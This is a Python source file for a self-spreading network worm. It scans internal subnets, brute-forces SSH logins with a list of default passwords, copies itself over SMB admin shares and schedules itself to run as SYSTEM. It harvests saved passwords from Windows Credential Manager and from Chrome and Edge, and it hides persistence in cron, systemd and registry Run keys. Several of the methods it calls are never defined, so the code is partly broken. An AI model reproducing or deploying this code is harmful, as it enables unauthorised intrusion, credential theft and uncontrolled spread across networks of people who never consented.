import hashlib
import os
import sys
import socket
import threading
import paramiko
import subprocess
import logging
import random
from pathlib import Path
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import sqlite3
import shutil
import win32crypt
import win32cred

# Configuration
SCAN_SUBNETS = ["192.168.100.0/24", "10.0.0.0/16"]
COMMON_PORTS = [22, 445, 3389, 5985, 5986, 135, 139]
MAX_WORKERS = 25
BEACON_PORT = 31337
DELAY_VARIANCE = (150, 300)
ANTI_DEBUG_INTERVAL = 300

CREDS = [
    ('administrator', 'P@ssw0rd'), ('admin', 'Admin123'),
    ('user', 'Welcome1'), ('svc_account', 'Summer2023!'),
    ('labuser', 'Password123'), ('root', 'toor'), ('pi', 'raspberry')
]


class NetworkWorm:
    def __init__(self):
        self.worm_path = Path(__file__).resolve()
        self.fingerprint = self._generate_fingerprint()
        self.lock = threading.Lock()
        self._setup_logging()
        self._verify_prerequisites()
        self._anti_analysis_thread()
        self._kill_previous_instances()

    def _generate_fingerprint(self):
        return hashlib.sha256(open(__file__, 'rb').read()).hexdigest()[:16]

    def _setup_logging(self):
        logging.basicConfig(
            filename='.systemlogs',
            level=logging.DEBUG,
            format='%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def _verify_prerequisites(self):
        try:
            if os.name == 'nt' and not Path("PsExec.exe").exists():
                subprocess.run(
                    ['curl', '-sO', 'https://live.sysinternals.com/tools/PsExec.exe'],
                    check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
                )
        except Exception as e:
            logging.error(f"Prerequisite error: {str(e)}")

    def spread(self):
        while True:
            try:
                self.self_replicate()
                self._evolve_persistence()
                self.scan_networks()
                sleep(random.uniform(*DELAY_VARIANCE))
                if random.random() < 0.3:
                    self._lateral_movement()
            except Exception as e:
                logging.error(f"Propagation error: {str(e)}")
                sleep(30)

    def _evolve_persistence(self):
        try:
            if os.name == 'posix':
                random.choice([
                    self._cron_persistence,
                    self._systemd_persistence
                ])()
            else:
                random.choice([
                    self._registry_persistence,
                    self._scheduled_task_persistence
                ])()
        except Exception as e:
            logging.error(f"Persistence error: {str(e)}")

    def _systemd_persistence(self):
        service_file = f"/etc/systemd/system/.{self.fingerprint}.service"
        if not Path(service_file).exists():
            content = f"""
            [Unit]
            Description=System Logging Service
            [Service]
            ExecStart={self.worm_path}
            Restart=always
            RestartSec=60
            [Install]
            WantedBy=multi-user.target
            """
            with open(service_file, 'w') as f:
                f.write(content)
            subprocess.run(['systemctl', 'daemon-reload', 'enable', service_file])

    def _lateral_movement(self):
        try:
            if os.name == 'nt':
                self._dump_windows_creds()
            self._exploit_network_shares()
            self._infect_removable_drives()
        except Exception as e:
            logging.error(f"Lateral movement error: {str(e)}")

    def _dump_windows_creds(self):
        try:
            harvested_creds = []

            # Windows Credential Manager
            try:
                creds = win32cred.CredEnumerate(None, 0)
                for cred in creds:
                    if cred['Type'] in [win32cred.CRED_TYPE_GENERIC, win32cred.CRED_TYPE_DOMAIN_PASSWORD]:
                        harvested_creds.append({
                            'source': 'Windows Credentials',
                            'user': cred['UserName'],
                            'password': cred['CredentialBlob'].decode('utf-16-le')
                        })
            except Exception as e:
                logging.error(f"Credential Manager error: {str(e)}")

            # Browser Credentials
            harvested_creds.extend(self._extract_browser_creds('Chrome'))
            harvested_creds.extend(self._extract_browser_creds('Edge'))

            # Update CREDS list
            for entry in harvested_creds:
                if entry.get('user') and entry.get('password'):
                    self.CREDS.append((entry['user'], entry['password']))

            return harvested_creds
        except Exception as e:
            logging.error(f"Credential dump failed: {str(e)}")
            return []

    def _extract_browser_creds(self, browser):
        try:
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                'Chrome': Path(appdata) / 'Google' / 'Chrome' / 'User Data',
                'Edge': Path(appdata) / 'Microsoft' / 'Edge' / 'User Data'
            }

            login_db = paths[browser] / 'Default' / 'Login Data'
            if not login_db.exists():
                return []

            temp_db = Path(os.getenv('TEMP')) / f'{browser}_temp.db'
            shutil.copy2(login_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            credentials = []
            for url, user, enc_pw in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(enc_pw, None, None, None, 0)[1].decode()
                    credentials.append({'source': browser, 'url': url, 'user': user, 'password': password})
                except Exception as e:
                    logging.error(f"Decryption failed: {str(e)}")

            conn.close()
            temp_db.unlink()
            return credentials
        except Exception as e:
            logging.error(f"Browser creds error: {str(e)}")
            return []

    def scan_networks(self):
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for subnet in SCAN_SUBNETS:
                network = ipaddress.ip_network(subnet, strict=False)
                futures.extend(executor.submit(self._probe_host, str(host)) for host in network.hosts())

            for future in as_completed(futures):
                if future.result():
                    logging.info(f"Infected host: {future.result()}")

    def _probe_host(self, ip):
        if self._is_infected(ip):
            return None

        for port in COMMON_PORTS:
            try:
                with socket.create_connection((ip, port), timeout=1.5):
                    return self._attack_host(ip, port)
            except:
                continue
        return None

    def _attack_host(self, ip, port):
        try:
            return {
                22: self._ssh_infection,
                445: self._smb_infection
            }.get(port, lambda x: None)(ip)
        except Exception as e:
            logging.error(f"Attack failed: {str(e)}")
            return None

    def _ssh_infection(self, ip):
        for user, passwd in CREDS:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=passwd, timeout=10)

                with client.open_sftp() as sftp:
                    sftp.put(__file__, f"/tmp/.{self.fingerprint}")
                    sftp.chmod(f"/tmp/.{self.fingerprint}", 0o755)

                client.exec_command(f"echo '@reboot /tmp/.{self.fingerprint}' | crontab -")
                client.exec_command(f"nohup /tmp/.{self.fingerprint} &>/dev/null &")
                self._mark_infection(ip)
                return ip
            except:
                continue
        return None

    def _smb_infection(self, ip):
        try:
            dest = fr"\\{ip}\C$\Windows\Temp\{self.fingerprint}.exe"
            shutil.copyfile(self.worm_path, dest)
            subprocess.run([
                'schtasks', '/create', '/s', ip, '/tn', f'WindowsUpdate_{self.fingerprint}',
                '/tr', dest, '/sc', 'ONSTART', '/ru', 'SYSTEM', '/f'
            ], check=True)
            self._mark_infection(ip)
            return ip
        except Exception as e:
            logging.error(f"SMB infection failed: {str(e)}")
            return None

    def self_replicate(self):
        try:
            if os.name == 'posix':
                dest = f"/usr/lib/.{self.fingerprint}"
                shutil.copy(__file__, dest)
                os.chmod(dest, 0o755)
                subprocess.run(f"(crontab -l ; echo '@reboot {dest}') | crontab -", shell=True)
            else:
                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
                shutil.copy(__file__, dest)
                subprocess.run(
                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
                    shell=True
                )
        except Exception as e:
            logging.error(f"Replication failed: {str(e)}")

    def _emergency_shutdown(self):
        try:
            if os.name == 'posix':
                Path(__file__).unlink()
                subprocess.run('crontab -r', shell=True)
            else:
                Path(__file__).unlink()
                subprocess.run(
                    f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "{self.fingerprint}" /f',
                    shell=True
                )
        finally:
            sys.exit(0)


if __name__ == "__main__":
    NetworkWorm().spread()